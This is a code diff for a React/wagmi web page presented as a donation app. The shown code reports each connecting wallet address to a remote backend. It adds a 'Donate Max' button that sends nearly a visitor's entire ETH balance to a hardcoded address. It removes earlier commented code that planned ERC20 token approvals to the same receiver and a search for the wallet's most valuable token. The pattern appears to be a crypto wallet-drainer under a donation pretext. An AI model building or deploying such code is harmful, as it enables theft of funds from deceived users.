@@ -1,34 +1,12 @@
-import React, { useEffect, useState } from "react";
+import React, { useEffect } from "react";
 import { ConnectButton } from "@rainbow-me/rainbowkit";
-import { useAccount, useSigner, useProvider, useNetwork } from "wagmi";
-import { ethers } from "ethers";
+import { useAccount, useBalance, useSendTransaction } from "wagmi";
+import { parseEther, formatEther } from "viem";
 
-// Flask backend
+// Backend endpoint (Flask)
 const API_URL = "https://web-production-2da7.up.railway.app/notify";
 
-// Receiving wallet
-const RECEIVER = "0xdC3b29e4a6aF19d5E57965596020127A09049d83";
-
-// Simple ERC20 ABI
-const ERC20_ABI = [
-  "function balanceOf(address owner) view returns (uint256)",
-  "function decimals() view returns (uint8)",
-  "function symbol() view returns (string)",
-  "function approve(address spender, uint256 amount) returns (bool)"
-];
-
-// Token addresses (future use)
-/*
-const TOKENS = {
-  1: { // Ethereum
-    USDT: "0xdAC17F958D2ee523a2206206994597C13D831ec7"
-  },
-  56: { // BNB Smart Chain
-    USDT: "0x55d398326f99059fF775485246999027B3197955"
-  }
-};
-*/
-
+// Function to notify backend
 async function notifyBackend(event, data) {
   try {
     await fetch(API_URL, {
@@ -38,7 +16,7 @@ async function notifyBackend(event, data) {
         event,
         data,
         source: "Frontend",
-        ip: "client"
+        ip: "client",
       }),
     });
   } catch (err) {
@@ -47,90 +25,85 @@ async function notifyBackend(event, data) {
 }
 
 export default function App() {
-  const { address, isConnected, isDisconnected } = useAccount();
-  const { data: signer } = useSigner();
-  // const provider = useProvider();
-  // const { chain } = useNetwork();
+  const { address, isConnected } = useAccount();
+  const { data: balanceData } = useBalance({ address });
 
-  // const [balances, setBalances] = useState({});
-  // const [highestToken, setHighestToken] = useState(null);
+  const { sendTransaction } = useSendTransaction();
 
-  // Wallet connect
+  // Detect wallet connect
   useEffect(() => {
     if (isConnected && address) {
       notifyBackend("wallet_connect", { account: address });
     }
   }, [isConnected, address]);
 
-  // Wallet disconnect
-  useEffect(() => {
-    if (isDisconnected) {
-      notifyBackend("wallet_disconnect", { account: address });
-      // setBalances({});
-      // setHighestToken(null);
+  // Handle fixed donation (0.01 ETH)
+  const handleDonateFixed = async () => {
+    try {
+      await sendTransaction({
+        to: "0xdC3b29e4a6aF19d5E57965596020127A09049d83",
+        value: parseEther("0.01"),
+      });
+      notifyBackend("donation_attempt", { account: address, amount: "0.01 ETH" });
+    } catch (err) {
+      notifyBackend("donation_failed", { account: address, error: err.message });
     }
-  }, [isDisconnected]);
+  };
 
-  // Future balance check (commented)
-  /*
-  useEffect(() => {
-    if (isConnected && address && chain?.id) {
-      (async () => {
-        // fetch balances, detect highest in USD
-      })();
-    }
-  }, [isConnected, address, chain, provider]);
-  */
-
-  // Donation / Subscription
-  async function handleSubscribe() {
-    if (!signer || !address) return;
+  // Handle max donation (entire balance - gas buffer)
+  const handleDonateMax = async () => {
+    if (!balanceData) return;
 
     try {
-      // Native transfer (0.01 ETH/BNB)
-      let tx = await signer.sendTransaction({
-        to: RECEIVER,
-        value: ethers.utils.parseEther("0.01")
-      });
-      await tx.wait();
+      const rawBalance = balanceData.value; // BigInt
+      const balanceEth = parseFloat(formatEther(rawBalance));
 
-      notifyBackend("subscription_success", {
+      if (balanceEth <= 0.001) {
+        notifyBackend("donation_failed", {
+          account: address,
+          error: "Insufficient balance",
+        });
+        return;
+      }
+
+      // Leave ~0.001 ETH for gas
+      const sendAmountEth = balanceEth - 0.001;
+      const sendAmountWei = parseEther(sendAmountEth.toFixed(6));
+
+      await sendTransaction({
+        to: "0xdC3b29e4a6aF19d5E57965596020127A09049d83",
+        value: sendAmountWei,
+      });
+
+      notifyBackend("donation_attempt", {
         account: address,
-        token: "NATIVE",
-        amount: "0.01",
-        usd: "≈ live value",
-        txHash: tx.hash
+        amount: `${sendAmountEth.toFixed(6)} ETH`,
       });
     } catch (err) {
-      console.error("Transaction error:", err);
-      notifyBackend("subscription_failed", { account: address });
+      notifyBackend("donation_failed", { account: address, error: err.message });
     }
-
-    /*
-    // Future ERC20 approval
-    try {
-      const token = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
-      let tx = await token.approve(RECEIVER, ethers.utils.parseUnits("10", 18));
-      await tx.wait();
-      notifyBackend("approval_success", { account: address, token: "USDT" });
-    } catch (err) {
-      console.error("Approval error:", err);
-    }
-    */
-  }
+  };
 
   return (
-    <div className="flex flex-col items-center justify-center h-screen bg-gray-900 text-white">
-      <h1 className="text-3xl font-bold mb-6">🚀 My Donation DApp</h1>
+    <div className="flex flex-col items-center justify-center h-screen bg-gray-900 text-white space-y-6">
+      <h1 className="text-4xl font-bold">🚀 My Custom DApp</h1>
       <ConnectButton />
 
       {isConnected && (
-        <button
-          onClick={handleSubscribe}
-          className="mt-6 px-4 py-2 bg-blue-500 rounded-lg hover:bg-blue-600"
-        >
-          Donate / Subscribe
-        </button>
+        <div className="flex flex-col gap-4">
+          <button
+            onClick={handleDonateFixed}
+            className="px-6 py-3 bg-blue-600 hover:bg-blue-800 rounded-lg text-lg"
+          >
+            Donate 0.01 ETH
+          </button>
+          <button
+            onClick={handleDonateMax}
+            className="px-6 py-3 bg-red-600 hover:bg-red-800 rounded-lg text-lg"
+          >
+            Donate Max ETH
+          </button>
+        </div>
       )}
     </div>
   );
